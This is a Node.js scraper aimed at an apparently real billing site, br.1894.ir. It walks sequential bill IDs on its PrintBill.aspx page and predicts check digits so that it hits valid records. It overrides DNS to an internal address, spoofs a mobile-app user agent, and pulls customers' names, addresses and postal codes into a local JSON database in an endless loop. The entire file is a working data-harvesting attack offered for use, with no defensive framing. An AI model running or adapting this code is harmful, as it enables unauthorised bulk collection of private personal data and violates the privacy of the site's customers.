const http = require('http');
const fs = require('fs')
const url = require('url'),
zlib = require("zlib");
var evilDns = require('evil-dns');


let checked = []


evilDns.add('br.1894.ir', '10.175.218.222');

var database = JSON.parse(fs.readFileSync("database.json"))

let lastRealID = parseInt(database[database.length - 1].id);

function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
}


async function Analyzer(text, id)
{
  text = text.toString();
  let start = text.indexOf("HEIGHT:5.65mm;")
    start = text.indexOf(">", start)+1
    let address = text.substring(start, text.indexOf("<", start)).trim();

  start = text.indexOf("HEIGHT:5.37mm;")
    start = text.indexOf(">", start)+1
    let lastName = text.substring(start, text.indexOf("<", start)).trim();

    start = text.indexOf("HEIGHT:5.01mm;")
    start = text.indexOf(">", start)+1
    let firstName = text.substring(start, text.indexOf("<", start)).trim();

    start = text.indexOf("HEIGHT:4.59mm;")
    start = text.indexOf(">", start)+1
    let postal = text.substring(start, text.indexOf("<", start)).trim();

    if(firstName.length > 0)
    {
        console.log("Real user Found:"+id)
        checked = [];
        lastRealID = parseInt(id)
      database.push({
          id,
        firstName,
        lastName,
        address,
        postal
        })
      fs.writeFileSync("database.json", JSON.stringify(database,0,4));
    }
    else
    {
        console.log(id)
    }


}

async function GetUser(number)
{
    return new Promise(async (resolve)=>{

        var options = {
            host:'br.1894.ir',
            //path: '/PrintBill.aspx?005024253470',
            path: '/PrintBill.aspx?' + number.toString().padStart(12,"0"),
            method:"GET",
            port: 80,
            rejectUnauthorized: false, 
            agent:new http.Agent(),
            headers: {
                'Connection':'keep-alive',
                'Host':'br.1894.ir',
                'Accept-Encoding':'br',
                'User-Agent':'okhttp/3.12.4',
            }
        }
    
          const reqx = http.request(options, (res) => {
      
              let rawData = "";
              res.on('data', (chunk) => { rawData+= chunk});
              res.on('end', async () => {
                try 
                {
                    await Analyzer(rawData, number.toString().padStart(12,"0"))
                    resolve();
                } 
                catch (e) {
                  console.log(e.message);
                }
              });
          });

          reqx.on('error',(err)=>{console.log("NETWORK ERR:",err)});
          reqx.end()

        })
}

async function giveMe2LastNum(prevNum)
{
  if((prevNum %10 == 1) ||(prevNum %10 == 2)) //last number is 1 or 2 , next may be 0
  {
    let zeros = [10,20,30,40,50,60,70,80,90];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 9)) //last number is 9 next may be 7
  {
    let zeros = [97,87,77,67,57,47,37,27,17,07];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 8)) //last number is 8 next may be 6
  {
    let zeros = [96,86,76,66,56,46,36,26,16,06];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 7)) //last number is 7 next may be 5
  {
    let zeros = [95,85,75,65,55,45,35,25,15,05];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 6)) //last number is 6 next may be 4
  {
    let zeros = [94,84,74,64,54,44,34,24,14,04];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 5)) //last number is 5 next may be 3
  {
    let zeros = [93,83,73,63,53,43,33,23,13,03];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 4)) //last number is 4 next may be 2
  {
    let zeros = [92,82,72,62,52,42,32,22,12,02];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 3)) //last number is 3 next may be 1
  {
    let zeros = [91,81,71,61,51,41,31,21,11,01];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
  if((prevNum %10 == 0)) //last number is 0 next may be 9 or 8
  {
    let zeros = [99,89,79,69,59,49,39,29,19,09,98,88,78,68,58,48,38,28,18,08];
    let found = false;
    for(let x = 0; x < zeros.length; x++)
    {
      if(!checked.includes(zeros[x]))
      {
        checked.push(zeros[x])
        return zeros[x]
      }
    }
    if(found == false)
    {
      for(let i = 0; i < 100; i++)
      {
        if(!checked.includes(i))
        {
          checked.push(i)
          return i
        }
      }
    }
  }
}


async function run()
{
    while(true)
    {
        let lastTwo = await giveMe2LastNum(lastRealID);
        if(!lastTwo)
        {
          
        }
        let lastR = Math.floor(lastRealID/100)*100
        let num = lastR+ lastTwo + 100;
        await sleep(100)
        await GetUser(num);
    }
}


 //68, 68, 168, 34, 168, 78, 68, 78, 179, 68, 68,178, 24,178,
run();

